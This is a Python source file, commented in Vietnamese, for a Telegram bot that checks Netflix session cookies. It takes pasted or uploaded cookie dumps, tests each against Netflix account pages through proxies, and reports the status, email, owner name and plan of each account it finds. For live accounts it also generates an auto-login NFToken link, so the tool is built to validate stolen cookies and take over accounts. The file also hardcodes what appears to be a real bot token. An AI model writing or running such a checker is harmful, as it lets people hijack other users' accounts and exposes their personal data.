import os
import re
import telebot
import requests
from urllib3.exceptions import InsecureRequestWarning
import threading

# Import trực tiếp các hàm xử lý từ main.py của bạn
import main

# Tắt cảnh báo SSL
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# 🔴 THAY THẾ TOKEN BOT CỦA BẠN VÀO ĐÂY (Lấy từ @BotFather)
TELEGRAM_BOT_TOKEN = "8918692221:AAEHCnNef9zBR9rFU8VcwWQQ9O-LIPAG8sA"

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Hàm tạo nút bấm "Kiểm tra tiếp" đính kèm dưới tin nhắn kết quả
def get_inline_restart_keyboard():
    markup = telebot.types.InlineKeyboardMarkup()
    btn_restart = telebot.types.InlineKeyboardButton("🔄 Kiểm tra tài khoản tiếp theo", callback_data="restart_bot")
    markup.add(btn_restart)
    return markup

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    welcome_text = (
        "👋 **Chào mừng bạn đến với Netflix Cookie Checker Bot!**\n\n"
        "⚡ **Cách sử dụng rất đơn giản:**\n"
        "1️⃣ **Cách 1:** Copy nội dung cookie và dán (Paste) thẳng tin nhắn văn bản vào đây.\n"
        "2️⃣ **Cách 2:** Gửi file định dạng `.txt` hoặc `.json` chứa cookie lên.\n\n"
        "Bot sẽ tự động bóc tách, kiểm tra trạng thái **LIVE / FREE / ON HOLD** và trả về Link đăng nhập nhanh (NFToken)!"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

# 📥 XỬ LÝ KHI NGƯỜI DÙNG DÁN TEXT COOKIE VÀO CHAT
@bot.message_handler(content_types=['text'])
def handle_cookie_text(message):
    if message.text.startswith('/'):
        return
        
    sent_msg = bot.reply_to(message, "⏳ Đang phân tích đoạn văn bản cookie của bạn, vui lòng đợi...")
    threading.Thread(target=process_cookie_data, args=(message.text, "Văn bản nhập trực tiếp", message, sent_msg)).start()

# 📥 XỬ LÝ KHI NGƯỜI DÙNG UP FILE (.TXT / .JSON)
@bot.message_handler(content_types=['document'])
def handle_cookie_file(message):
    if not os.path.exists("temp_bot"):
        os.makedirs("temp_bot")
        
    file_info = bot.get_file(message.document.file_id)
    file_name = message.document.file_name
    
    if not file_name.lower().endswith(('.txt', '.json')):
        bot.reply_to(message, "❌ Vui lòng chỉ gửi file định dạng `.txt` hoặc `.json`!")
        return

    sent_msg = bot.reply_to(message, "⏳ Đang tải file và tiến hành kiểm tra cookie, vui lòng đợi...")
    
    downloaded_file = bot.download_file(file_info.file_path)
    file_path = os.path.join("temp_bot", file_name)
    
    with open(file_path, 'wb') as new_file:
        new_file.write(downloaded_file)
        
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        if os.path.exists(file_path):
            os.remove(file_path)
            
        threading.Thread(target=process_cookie_data, args=(content, file_name, message, sent_msg)).start()
    except Exception as e:
        bot.edit_message_text(f"⚠️ Lỗi đọc file: {str(e)}", sent_msg.chat.id, sent_msg.message_id)

# ⚙️ HÀM XỬ LÝ LÕI VÀ TRẢ KẾT QUẢ (DÙNG CHUNG)
def process_cookie_data(raw_content, source_name, original_msg, progress_msg):
    try:
        bundles = main.extract_netflix_cookie_bundles(raw_content)
        if not bundles:
            bot.edit_message_text("❌ Không tìm thấy cấu trúc cookie Netflix hợp lệ trong dữ liệu bạn gửi!", progress_msg.chat.id, progress_msg.message_id, reply_markup=get_inline_restart_keyboard())
            return
            
        bot.edit_message_text(f"🔍 Tìm thấy {len(bundles)} tài khoản tiềm năng. Đang check qua Proxy...", progress_msg.chat.id, progress_msg.message_id)
        
        proxies = main.load_proxies()
        config = main.DEFAULT_CONFIG
        request_timeout = config["performance"]["request_timeout_seconds"]
        
        success_count = 0
        final_report = ""
        
        for idx, bundle in enumerate(bundles):
            netscape_text = bundle.get("netscape_text", "")
            cookies = bundle.get("cookies") or main.cookies_dict_from_netscape(netscape_text)
            
            session = requests.Session()
            session.cookies.update(cookies)
            
            proxy = main.random.choice(proxies) if proxies else None
                
            try:
                response_text, status_code, extracted_info = main.get_account_page(
                    session, proxy, request_timeout=request_timeout, fallback_account_page=True
                )
                
                if status_code == 200 and response_text:
                    info = extracted_info or main.extract_info(response_text)
                    
                    if info.get("countryOfSignup") and info.get("countryOfSignup") != "null":
                        is_subscribed = main.is_subscribed_account(info)
                        plan_key, _, plan_name = main.derive_output_plan_bucket(info, is_subscribed)
                        country = info.get("countryOfSignup") or "Unknown"
                        flag = main.country_code_to_flag(country)
                        
                        # 🔍 KIỂM TRA TRẠNG THÁI ON HOLD (BỊ ĐÌNH CHỈ / LỖI THANH TOÁN)
                        account_on_hold = is_subscribed and main.is_on_hold_account(info)
                        
                        if account_on_hold:
                            status_str = "⚠️ **ON HOLD** (Lỗi thanh toán / Tạm giữ tài khoản)"
                        elif is_subscribed:
                            status_str = "🔥 **LIVE** (Hoạt động tốt - Có Gói)"
                        else:
                            status_str = "❄️ **FREE** (Tài khoản trống / Hết hạn)"
                        
                        # Tạo liên kết đăng nhập tự động NFToken
                        nftoken_data, _ = main.create_nftoken(cookies, attempts=1)
                        nftoken_link_str = ""
                        if is_subscribed and main.has_usable_nftoken(nftoken_data):
                            token = nftoken_data["token"]
                            nftoken_link_str = f"\n🌐 **Link đăng nhập nhanh:** https://netflix.com/?nftoken={token}"
                        
                        final_report += (
                            f"📝 **Tài khoản #{idx+1}**\n"
                            f"▪️ Trạng thái: {status_str}\n"
                            f"▪️ Quốc gia: {country} {flag}\n"
                            f"▪️ Gói cước: {plan_name}\n"
                            f"▪️ Email: `{info.get('email', 'N/A')}`\n"
                            f"▪️ Profile chủ: {info.get('accountOwnerName', 'N/A')}\n"
                            f"{nftoken_link_str}\n\n"
                        )
                        success_count += 1
                        continue
            except Exception:
                pass
                
            final_report += f"❌ **Tài khoản #{idx+1}:** Cookie không chính xác, hết hạn hoặc lỗi Proxy.\n\n"

        header = f"📊 **KẾT QUẢ CHECK COOKIE**\n📦 Nguồn: {source_name}\n✅ Thành công: {success_count}/{len(bundles)}\n----------------------------------------\n"
        bot.delete_message(progress_msg.chat.id, progress_msg.message_id)
        
        # Đính kèm nút bấm Inline "Kiểm tra tài khoản tiếp theo" vào tin nhắn kết quả cuối cùng
        bot.send_message(original_msg.chat.id, header + final_report, parse_mode="Markdown", disable_web_page_preview=True, reply_markup=get_inline_restart_keyboard())
        
    except Exception as e:
        bot.edit_message_text(f"⚠️ Có lỗi hệ thống: {str(e)}", progress_msg.chat.id, progress_msg.message_id, reply_markup=get_inline_restart_keyboard())

# 🔄 BỘ LẮNG NGHE SỰ KIỆN KHI NGƯỜI DÙNG ẤN VÀO NÚT "Kiểm tra tài khoản tiếp theo"
@bot.callback_query_handler(func=lambda call: call.data == "restart_bot")
def callback_restart(call):
    bot.answer_callback_query(call.id)
    send_welcome(call.message)

# Thiết lập nút Menu nhanh ở góc trái khung chat hệ thống
bot.set_my_commands([
    telebot.types.BotCommand("start", "🔄 Khởi động lại Bot / Xem hướng dẫn"),
])

print("🤖 Bot Telegram đang khởi động và sẵn sàng nhận dữ liệu...")
bot.infinity_polling()